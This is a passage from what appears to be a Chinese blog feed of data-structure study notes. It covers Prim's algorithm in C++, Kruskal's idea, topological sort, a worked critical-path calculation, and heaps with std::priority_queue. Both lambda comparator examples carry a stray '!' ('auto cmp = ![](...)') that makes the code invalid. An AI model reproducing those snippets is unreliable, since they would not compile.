operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> v<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">//v 点我还没去过，并且我发现u到v点的路径比我一开始设定的minDist还要短，那我就把它改成u到v的边，调整一下</span>                dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> totalWeight<span class="token punctuation">;</span> <span class="token comment">// 输出最短路径</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输入格式（邻接矩阵，邻接表实现其实要麻烦一些，要遍历表找最值）</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin <span class="token operator">>></span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">graph</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> graph<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>graph<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">!=</span> j<span class="token punctuation">)</span> graph<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> INT_MAX<span class="token punctuation">;</span> <span class="token comment">// 无边当作 ∞</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Prim 算法遍历邻接矩阵所有点</strong>，平均时间复杂度为O(n^2)。</p><ul><li>邻接表实现：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Edge</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> weight<span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">const</span> Edge <span class="token operator">&amp;</span>e<span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> weight <span class="token operator">></span> e<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>  <span class="token comment">// 小根堆</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1001</span><span class="token punctuation">;</span> <span class="token comment">//顶点最大个数</span>vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span> graph<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//图，邻接表表示的，数组索引i表示是第i个节点，存的是边链表的头</span><span class="token keyword">bool</span> visited<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">prim</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    priority_queue<span class="token operator">&lt;</span>Edge<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>Edge<span class="token operator">>></span> pq<span class="token punctuation">;</span>    visited<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>e <span class="token operator">:</span> graph<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">int</span> total_weight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Edge curr <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>visited<span class="token punctuation">[</span>curr<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        visited<span class="token punctuation">[</span>curr<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        total_weight <span class="token operator">+=</span> curr<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>e <span class="token operator">:</span> graph<span class="token punctuation">[</span>curr<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> total_weight<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Kruskal-算法">Kruskal 算法</h4><p>算法思想很简单：</p><blockquote><p>我先把全世界最便宜的边找出来，想加就加，只要它不会成环。</p></blockquote><p>那么<strong>先把边按权值大小排序，从上往下加入边，如果不成环就加</strong>。（这里判断是否成环需要用到并查集）。<br>代码之后补充，因为还没了解并查集😿。</p><hr><h3 id="拓扑排序算法">拓扑排序算法</h3><p><img src="https://img.moyuin.top/i/2025/04/10/67f7b8ca34b28.png" alt="image.png"></p><p>拓扑排序还是很容易去理解的，我们根据前后关联性可以轻松写出它的拓扑排序。<br>拓扑排序算法一般还是用于查找该图“是否有拓扑排序”。</p><hr><h4 id="关键路径">关键路径</h4><p>从起点到某点的最长路径称为起点到该点的<strong>关键路径</strong>。一般用于AOE网络。<br><img src="https://img.moyuin.top/i/2025/04/15/67fdc0f8c51bb.png" alt="image.png"></p><p>关键路径上的活动被称为<strong>关键活动</strong>。<br>对于一个图的优先调度，有多余的人力物力放在非关键路径上其实是不起效果的。<br><strong>求解关键路径</strong>：<br><img src="https://img.moyuin.top/i/2025/04/15/67fdc43fa4398.png" alt="image.png"></p><p>目标：<strong>从 v₀ 出发走到 v₈，找出耗时最长但不能耽误任何环节的一条路径，也就是“关键路径”。</strong></p><p>A. 先算每个事件的 <code>earliest[v]</code><br>从起点 v₀ 开始，最早发生时间记为 0<br>然后向下游传播，按下式推：</p><blockquote><p><code>earliest[v] = max&#123; earliest[u] + weight(u,v) &#125;</code></p></blockquote><p>按顺序来算：</p><ul><li><p><strong>v₀</strong> = 0（起点）</p></li><li><p><strong>v₁</strong> = v₀ + 5 = <strong>5</strong>（a₀）</p></li><li><p><strong>v₂</strong> = v₀ + 3 = <strong>3</strong>（a₁）</p></li><li><p><strong>v₃</strong> = v₂ + 5 = <strong>8</strong>（a₂）</p></li><li><p><strong>v₄</strong> 有两条路：</p><ul><li>v₂ + 1 = 4（a₃）</li><li>v₁ + 4 = 9（a₄）→ 取 max → <strong>9</strong></li></ul></li><li><p><strong>v₅</strong> = v₁ + 2 = <strong>7</strong>（a₅）</p></li><li><p>v₆ 有两条路：</p><ul><li>v₃ + 7 = 15（a₆）</li><li>v₄ + 5 = 14（a₇）→ max → <strong>15</strong></li></ul></li><li><p><strong>v₇</strong> 有两条路：</p><ul><li>v₄ + 5 = 14（a₈）</li><li>v₅ + 6 = 13（a₉）→ max → <strong>14</strong></li></ul></li><li><p><strong>v₈</strong> 有两条路：</p><ul><li>v₆ + 2 = 17（a₁₀）</li><li>v₇ + 8 = 22（a₁₁）→ max → <strong>22</strong></li></ul></li></ul><p>于是你现在有了 <code>earliest[v]</code> ：见图中绿色数字。</p><p>B. 反过来算 <code>latest[v]</code>（从终点往前推）<br>从终点 v₈ 开始：</p><ul><li>v₈ = 22（设为基准）<br>我们用公式：</li></ul><blockquote><p><code>latest[u] = min&#123; latest[v] - weight(u,v) &#125;</code></p></blockquote><p>倒着来算</p><ul><li><p>v₇ = v₈ - 8 = <strong>14</strong>（a₁₁）</p></li><li><p>v₆ = v₈ - 2 = <strong>20</strong>（a₁₀）</p></li><li><p>v₅ = v₇ - 6 = <strong>8</strong>（a₉）</p></li><li><p>v₄：</p><ul><li>v₇ - 5 = 9（a₈）</li><li>v₆ - 5 = 15（a₇）→ 取 <strong>min = 9</strong></li></ul></li><li><p>v₃ = v₆ - 7 = <strong>13</strong></p></li><li><p>v₂：</p><ul><li>v₃ - 5 = 8（a₂）</li><li>v₄ - 1 = 8（a₃）→ min = <strong>8</strong></li></ul></li><li><p>v₁:</p><ul><li>v₄ - 4 = 5（a₄）</li><li>v₅ - 2 = 6（a₅）→ min = <strong>5</strong></li></ul></li><li><p>v₀:</p><ul><li>v₁ - 5 = 0（a₀）</li><li>v₂ - 3 = 5（a₁）→ min = <strong>0</strong></li></ul></li></ul><p>C. 计算每条活动的 e[i] 和 l[i]<br>对每条活动 aᵢ：<br><code>e[i] = earliest[u]</code> （活动起点的最早时间）<br><code>l[i] = latest[v] - weight(u,v)</code>（终点最晚时间-任务耗时）<br>若 <code>e[i] == l[i]</code>，说明该活动不能晚，就是关键路径的一部分！</p><p>我们来实际举几个：<br>a₀（v₀→v₁）：</p><ul><li>e[0] = earliest[v₀] = 0</li><li>l[0] = latest[v₁] - 5 = 5 - 5 = 0 ✔️ e = l → <strong>关键路径</strong></li></ul><p>a₄（v₁→v₄）：</p><ul><li>e = 5（v₁）</li><li>l = 9 - 4 = 5 ✔️ 关键路径</li></ul><p>a₆（v₃→v₆）：</p><ul><li>e = 8（v₃）</li><li>l = 20 - 7 = 13 ✘ 不是关键路径（8 ≠ 13）</li></ul><p>连接所有 e[i]=I[i] 的点，得到关键路径。<br>最终关键路径是：</p><blockquote><p><strong>v₀ → v₁ → v₄ → v₇ → v₈</strong></p></blockquote><p>总耗时：5 + 4 + 5 + 8 = <strong>22</strong>（也就是项目最早完成时间）</p>]]></content>
    
    
    <summary type="html">图的笔记</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-堆</title>
    <link href="https://notes.moyuin.top/2025/04/01/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-dui/"/>
    <id>https://notes.moyuin.top/2025/04/01/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-dui/</id>
    <published>2025-04-01T08:27:32.000Z</published>
    <updated>2025-04-01T08:27:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>数据结构-堆</h1><h1>堆(实现优先级队列)</h1><p>优先级队列是一种特殊的队列，特殊在优先级队列的<strong>出队顺序</strong>按照事先规定的<strong>优先级顺序</strong>进行。<br>可以用<strong>线性表</strong>实现，但每次需要遍历，这样的出队操作复杂度为 O(n)，效率低，因此考虑使用<strong>堆</strong>来实现优先级队列。<br>堆通常看作是<strong>一棵完全二叉树</strong>，且某个节点的值总是不大于或不小于其父节点的值。</p><h2 id="基本理解">基本理解</h2><p>参考的是CSDN的一条<a href="https://blog.csdn.net/xiaomucgwlmx/article/details/103522410">教程</a>，很好理解。</p><h3 id="堆的插入">堆的插入</h3><p>每次都是新数据放在数组最后，然后将数据交换以满足堆的性质（最大堆，最小堆）。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401161835075.png" alt=""><br>插入数据 16<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401162218264.png" alt=""><br>为满足最大堆，调整位置，有父节点与孩节点交换。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401161953977.png" alt=""><br>依然没有完全符合最大堆（根节点数据最大），继续调整位置。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401162400848.png" alt=""></p><h3 id="堆的节点删除">堆的节点删除</h3><p><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401162859978.png" alt=""><br>堆中<strong>每次删除都只能删除堆顶元素</strong>。实际操作是给最后一个数据的值（最大或最小值，视堆的性质而定）赋值到堆顶，然后调整位置。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401163525900.png" alt=""><br>然后开始不断调整…<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401163552994.png" alt=""><br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401163558282.png" alt=""></p><h3 id="构造最大堆">构造最大堆</h3><p>我们从一个例题开始。目前我们有原始数组<br><code>a[]=&#123;4,1,3,2,16,9,10,14,8,7&#125;</code><br>采用顺序存储的方式，对应的完全二叉树如下图：<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401163639280.png" alt=""><br>假设数组中有 n 个元素，我们的遍历与调整应该从<code>a[i],此时 i=n/2-1</code> 开始，然后往前推。（即最中间的那个元素），将它看作父节点，去和它的孩子比较（<strong>不要和它的父节点比较</strong>）。一样的逻辑，不断比较父节点和孩子节点调整，最后做到最大的数在最上面。</p><p><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86/20250401164025600.png" alt=""></p><p>推完了如果发现不是最大堆形式，我们就从最初点（ <code>a[0]</code> ）继续交换，对交换后的值继续交换…</p><p><strong>最小堆构造与最大堆构造几乎一致，只是比较调整的时候逻辑是最小的换到父节点。</strong></p><ul><li>最大堆的插入节点就是在堆的最后，最小值后面添加一个节点，然后沿着数堆上升调整，和堆的插入是一致的。</li><li>堆顶节点删除思想：将堆树的最后节点放到根节点，删除最大值，再重新初始化调整比较。<br>逻辑是一样的。</li></ul><h2 id="概念">概念</h2><h3 id="二叉堆">二叉堆</h3><p>二叉堆是一个用<strong>完全二叉树</strong>来实现的<strong>优先队列</strong>结构，支持高效插入与取最值操作。</p><h4 id="特点">特点</h4><ul><li><strong>完全二叉树</strong>（除了最后一层，其他层都满，且从左到右填满）</li><li>每个结点都满足：<ul><li><strong>最小堆（小根堆）</strong>：父节点 ≤ 子节点</li><li><strong>最大堆（大根堆）</strong>：父节点 ≥ 子节点</li></ul></li><li>用<strong>数组</strong>实现（因为完全二叉树可以用下标映射）</li></ul><h4 id="小技巧">小技巧</h4><ul><li>父节点下标 i → 左子节点 2i，右子节点 2i+1</li><li>子节点 j → 父节点是 j/2（向下取整）</li><li>上调插入 push O(log n)，下调删除最值 pop O(log n)，取最值 O(1)<br>二叉堆是一种隐式数据结构，将元素的逻辑结构蕴含在存储结构中，避免额外的指针空间开销，所以经常用。</li></ul><h3 id="多叉堆">多叉堆</h3><p>多叉堆（d-ary heap）就是一个<strong>每个节点有 d 个孩子的堆</strong>，也是一种用数组实现的优先队列。</p><h4 id="特点-2">特点</h4><ul><li>一般是<strong>d 叉完全树</strong></li><li>小根堆 / 大根堆原则依然成立</li><li>结构仍然是数组实现，不过下标关系会变化：</li></ul><p>📌 设根节点下标为 0（或 1 视实现而定）：</p><ul><li>父节点  i → 子节点范围是：<code>d*i + 1</code> 到 <code>d*i + d</code></li><li>子节点  j→ 父节点是：<code>(j - 1) / d</code></li></ul><h3 id="应用">应用</h3><ul><li>哈夫曼树的构建。<br><img src="/images/%E6%A0%91/20250325101821385.png" alt=""></li><li>Dijkstra 最短路径的构建</li><li>贪心算法</li></ul><h2 id="实现">实现</h2><h3 id="STL-实现">STL 实现</h3><p>在 STL 里有一个现成的“优先队列”。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>priority_queue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本身是一个堆结构封装好的数据结构，默认用的是大根堆，最大值优先。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> pq<span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 输出 8（最大值）</span>    pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除最大值</span>    cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 输出 5</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要最小值优先，可以构造优先级队列的时候，传入比较函数。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> pq<span class="token punctuation">;</span>pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 输出 2（最小值）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要自定义结构体的优先级，得先写一个比较器（或者lambda表达式等）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">,</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">cmp</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> Node <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> Node <span class="token operator">&amp;</span>b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token punctuation">.</span>val <span class="token operator">></span> b<span class="token punctuation">.</span>val<span class="token punctuation">;</span> <span class="token comment">// 小根堆：val小的优先</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>Node<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Node<span class="token operator">></span><span class="token punctuation">,</span> cmp<span class="token operator">></span> pq<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里也附上一个lambda表达式的模板，由于 lambda 是匿名类型，而priority_queue 是模板类，所以传参略微复杂。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> cmp <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>second <span class="token operator">></span> b<span class="token punctuation">.</span>second<span class="token punctuation">;</span>  <span class="token comment">// 小根堆：值小的优先</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>    pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span>    vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span>    <span class="token keyword">decltype</span><span class="token punctuation">(</span>cmp<span class="token punctuation">)</span><span class="token operator">></span> <span class="token function">pq</span><span class="token punctuation">(</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么要写 <code>decltype(cmp)</code>？</p><ul><li>因为 lambda 是匿名类型，必须用 <code>decltype</code> 获取它的类型作为模板参数。</li><li>然后把这个比较器传进去初始化构造函数 <code>pq(cmp)</code><br><strong>完整用法</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 按 second 小的优先（小根堆）</span>    <span class="token keyword">auto</span> cmp <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token punctuation">.</span>second <span class="token operator">></span> b<span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    priority_queue<span class="token operator">&lt;</span>        pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span>        vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span>        <span class="token keyword">decltype</span><span class="token punctuation">(</span>cmp<span class="token punctuation">)</span>    <span class="token operator">></span> <span class="token function">pq</span><span class="token punctuation">(</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注意要传 cmp 进去！</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token 